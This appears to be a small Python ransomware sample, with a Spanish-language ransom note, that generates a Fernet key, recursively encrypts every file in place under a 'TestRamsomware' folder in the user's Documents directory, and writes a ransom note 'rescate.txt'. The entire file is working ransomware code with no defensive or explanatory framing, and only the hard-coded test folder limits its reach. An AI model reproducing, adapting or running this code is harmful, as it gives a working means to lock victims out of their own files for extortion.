from cryptography.fernet import Fernet
import os

def generateKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def returnKey():
    return open("key.key", "rb").read()

def encryp(item,key):
    key = Fernet(key)
    with open(item, "rb") as file:
        file_data = file.read()
    data = key.encrypt(file_data)
    with open(item, "wb") as file:
        file.write(data)

def getPath():
    path = os.path.join(os.environ['USERPROFILE'],"Documents","TestRamsomware")
    if not os.path.exists(path):
        path = os.path.join(os.environ['USERPROFILE'],"Documentos","TestRamsomware")
    print(path)
    return path

def inspectFolders(path):
    documentos = os.listdir(path)
    for documento in documentos:
        documento = os.path.join(path, documento)
        if(os.path.isdir(documento)):
            inspectFolders(documento)
        else:
            encryp(documento, returnKey())

def rescueText():
    path = getPath()+"\\rescate.txt"
    if not os.path.exists(path):
        with open(path, "w") as file:
            file.write("Archivos encriptados")
            file.close()

if __name__ == "__main__":
    generateKey()
    inspectFolders(getPath())
    rescueText()